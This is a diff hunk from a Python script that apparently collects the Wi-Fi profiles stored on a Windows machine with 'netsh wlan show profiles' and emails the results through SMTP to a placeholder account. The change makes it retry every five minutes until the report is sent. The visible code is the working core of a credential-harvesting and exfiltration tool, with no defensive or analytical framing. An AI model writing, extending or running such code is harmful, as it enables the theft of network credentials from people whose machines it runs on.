@@ -11,8 +11,8 @@ def send_mail(email, password, message):                  #function for sending 
         server.sendmail(email, email, message)                # can change sender or receivers address
         server.quit()
     except:
-        time.sleep(10)                                         # Delay(Basically hoping that internet turns on)
-        send_mail("<YOUR_EMAIL>", "<YOUR_PASSWORD>", result)      # function call to send the reports
+        time.sleep(300)                                         # Delay(checking every 5 mins if the internet has turned on )
+        send_mail("<YOUR_EMAIL>", "<YOUR_PASSWORD>", result)    # function call to send the reports
 
 command = "netsh wlan show profiles"                      # To show the names of all Wlan profiles stored
 networks = subprocess.check_output(command, shell=True).decode('utf-8')  #.decode('utf-8') used to change its form, if not done, it returns error "that output is not a string type"
